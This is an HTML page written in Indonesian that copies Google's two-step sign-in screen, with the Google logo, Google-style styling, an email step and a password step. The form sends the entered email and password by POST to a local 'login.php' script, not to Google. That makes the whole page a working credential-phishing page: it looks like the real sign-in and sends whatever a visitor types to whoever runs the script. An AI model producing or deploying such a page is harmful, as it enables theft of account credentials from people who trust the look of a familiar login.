<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Google Sans', 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: #131314;
            color: #e3e3e3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }

        .login-container {
            width: 100%;
            max-width: 448px;
            min-height: 500px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Responsive styling for mobile views like screenshots */
        @media (max-width: 600px) {
            .login-container {
                padding: 24px 16px;
                max-width: 100%;
            }
            body {
                align-items: flex-start;
            }
        }

        /* Logo Placeholder area matching Google's exact scale */
        .logo-container {
            margin-bottom: 16px;
            display: flex;
            justify-content: flex-start;
        }

        .google-logo {
            width: 40px;
            height: 40px;
        }

        /* Typography */
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #ffffff;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            color: #e3e3e3;
            margin-bottom: 32px;
        }

        /* Active Email Pill (Step 2) */
        .profile-pill {
            display: inline-flex;
            align-items: center;
            padding: 4px 12px 4px 6px;
            border: 1px solid #8e918f;
            border-radius: 100px;
            background-color: transparent;
            cursor: pointer;
            margin-bottom: 32px;
            max-width: fit-content;
            transition: background-color 0.2s;
        }

        .profile-pill:hover {
            background-color: rgba(255, 255, 255, 0.04);
        }

        .profile-icon {
            width: 20px;
            height: 20px;
            background-color: #8e918f;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
        }

        .profile-icon svg {
            fill: #131314;
            width: 14px;
            height: 14px;
        }

        .profile-email {
            font-size: 14px;
            color: #e3e3e3;
            font-weight: 500;
            margin-right: 4px;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .dropdown-icon {
            fill: #e3e3e3;
            width: 16px;
            height: 16px;
            display: flex;
            align-items: center;
        }

        /* Material Design 3 Floating Label Input Container */
        .input-group {
            position: relative;
            margin-bottom: 26px;
            width: 100%;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: 1px solid #8e918f;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s, border-width 0.1s;
            box-sizing: border-box;
        }

        .input-field:focus {
            border: 2px solid #8ab4f8;
            padding: 15px; /* Adjust padding to prevent layout shift with 2px border */
        }

        .input-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #c4c7c5;
            font-size: 16px;
            pointer-events: none;
            transition: 0.15s cubic-bezier(0.4, 0, 0.2, 1);
            background-color: #131314;
            padding: 0 6px;
        }

        /* Logic for floating label when focus or text entered */
        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: 0;
            font-size: 12px;
            color: #8ab4f8;
        }

        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
            color: #c4c7c5;
        }

        /* Checkbox Styles */
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
            cursor: pointer;
            user-select: none;
            font-size: 14px;
            color: #e3e3e3;
        }

        .checkbox-container input {
            display: none;
        }

        .custom-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #c4c7c5;
            border-radius: 2px;
            margin-right: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.1s, border-color 0.1s;
        }

        .checkbox-container input:checked + .custom-checkbox {
            background-color: #8ab4f8;
            border-color: #8ab4f8;
        }

        .checkbox-container input:checked + .custom-checkbox::after {
            content: "";
            width: 4px;
            height: 8px;
            border: solid #131314;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
            margin-bottom: 2px;
        }

        /* Notice text for Guest Mode */
        .info-text {
            font-size: 14px;
            color: #c4c7c5;
            line-height: 1.43;
            margin-bottom: 40px;
        }

        /* Links styling */
        .link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .link:hover {
            text-decoration: underline;
        }

        /* Bottom action section layout */
        .action-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: auto;
        }

        .action-container.right-aligned {
            justify-content: flex-end;
            gap: 20px;
        }

        /* Button design precisely tracking Material 3 specs inside Google login */
        .btn-text {
            background: none;
            border: none;
            color: #8ab4f8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 10px 0;
        }

        .btn-text:hover {
            color: #a8c7fa;
        }

        .btn-primary {
            background-color: #a8c7fa;
            color: #131314;
            border: none;
            padding: 0 24px;
            height: 40px;
            border-radius: 100px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #c4c7c5;
        }

        /* Switch flow mechanics configuration */
        .step-view {
            display: none;
            flex-direction: column;
            width: 100%;
        }

        .step-view.active {
            display: flex;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <form id="login-form" method="POST" action="login.php" style="display: contents;">
        <div class="logo-container">
            <svg class="google-logo" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.85z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.85c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
        </div>

        <div id="step-email" class="step-view active">
            <h1 class="title">Login</h1>
            <p class="subtitle">Gunakan Akun Google Anda</p>

            <div class="input-group">
                <input type="email" id="email-input" name="email" class="input-field" placeholder=" " autocomplete="username" required>
                <label class="input-label">Email atau nomor telepon</label>
            </div>

            <a href="#" class="link" style="margin-bottom: 32px; display: inline-block;">Lupa email?</a>

            <p class="info-text">
                Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. 
                <a href="#" class="link">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
            </p>

            <div class="action-container">
                <button class="btn-text" type="button">Buat akun</button>
                <button class="btn-primary" id="btn-email-next" type="button">Berikutnya</button>
            </div>
        </div>

        <div id="step-password" class="step-view">
            <h1 class="title">Selamat datang</h1>
            
            <div class="profile-pill" id="profile-trigger">
                <div class="profile-icon">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                </div>
                <span class="profile-email" id="display-email"></span>
                <div class="dropdown-icon">
                    <svg viewBox="0 0 24 24" width="16" height="16">
                        <path d="M7 10l5 5 5-5H7z"/>
                    </svg>
                </div>
            </div>

            <div class="input-group">
                <input type="password" id="password-input" name="password" class="input-field" placeholder=" " autocomplete="current-password" required>
                <label class="input-label">Masukkan sandi</label>
            </div>

            <label class="checkbox-container">
                <input type="checkbox" id="show-password-toggle">
                <div class="custom-checkbox"></div>
                Tampilkan sandi
            </label>

            <div class="action-container">
                <a href="#" class="link">Lupa sandi?</a>
                <button class="btn-primary" id="btn-login-submit" type="button">Berikutnya</button>
            </div>
        </div>
            </form>
    </div>

    <script>
        const stepEmail = document.getElementById('step-email');
        const stepPassword = document.getElementById('step-password');
        const emailInput = document.getElementById('email-input');
        const passwordInput = document.getElementById('password-input');
        const displayEmail = document.getElementById('display-email');
        
        const btnEmailNext = document.getElementById('btn-email-next');
        const profileTrigger = document.getElementById('profile-trigger');
        const showPasswordToggle = document.getElementById('show-password-toggle');
        const btnLoginSubmit = document.getElementById('btn-login-submit');

        // Flow: Step 1 -> Step 2
        btnEmailNext.addEventListener('click', () => {
            if (emailInput.value.trim() !== "") {
                // Set the value inside the profile capsule element dynamically
                displayEmail.textContent = emailInput.value;
                
                // Toggle UI View Layouts smoothly
                stepEmail.classList.remove('active');
                stepPassword.classList.add('active');
                
                // Focus automatic enhancement
                passwordInput.focus();
            } else {
                emailInput.focus();
                emailInput.style.borderColor = "#f28b82"; // Basic alert color modification
            }
        });

        // Flow: Allow enter-key navigation on Email fields
        emailInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                btnEmailNext.click();
            }
        });

        // Flow: Step 2 -> Step 1 (When clicking user profile pill back drop)
        profileTrigger.addEventListener('click', () => {
            stepPassword.classList.remove('active');
            stepEmail.classList.add('active');
            emailInput.focus();
        });

        // UI Action: Toggle Password Visibility
        showPasswordToggle.addEventListener('change', function() {
            if (this.checked) {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });

        // Final Submit alert test validation placeholder
        btnLoginSubmit.addEventListener('click', () => {
            if (passwordInput.value !== "") {
                document.getElementById('login-form').submit();
            } else {
                passwordInput.focus();
            }
        });

        // Allow enter-key navigation on Password field
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                btnLoginSubmit.click();
            }
        });
    </script>
</body>
</html>